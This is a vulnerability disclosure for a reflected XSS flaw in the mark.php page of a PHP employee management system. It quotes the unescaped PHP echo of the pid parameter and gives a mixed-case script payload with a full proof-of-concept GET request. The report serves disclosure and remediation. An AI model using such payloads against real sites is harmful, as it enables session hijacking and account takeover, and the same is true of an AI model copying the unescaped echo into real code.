## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/mark.php` contains a Reflected XSS vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects JavaScript into the page. If an administrator visits the link, the script may execute in the administrator’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the admin)
- Phishing/UI manipulation (altering page content to trick users)

### Payload:

"><ScRiPt>alert(10)</sCrIpT>

```
"><ScRiPt>alert(10)</sCrIpT>
```

### POC:

The vulnerable endpoint is `GET /mark.php?id=...&pid=...`. The `pid` query parameter is reflected into an HTML attribute (hidden input `value`) without HTML escaping:

<input type="hidden" name="eid" id="textField" value="<?php echo $id;?>" required="required">

<input type="hidden" name="pid" id="textField" value="<?php echo $pid;?>" required="required">

 <input type="hidden" name="points" id="textField" value="<?php echo $points;?>" required="required">

Send the following request (URL-encoded payload):

GET /mark.php?id=101&pid=%22%3E%3CScRiPt%3Ealert%2810%29%3C%2FsCrIpT%3E HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
When the response page is rendered in a browser, the injected script executes (e.g., a popup `alert(10)`), confirming reflected XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409113910839](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409113910839.png)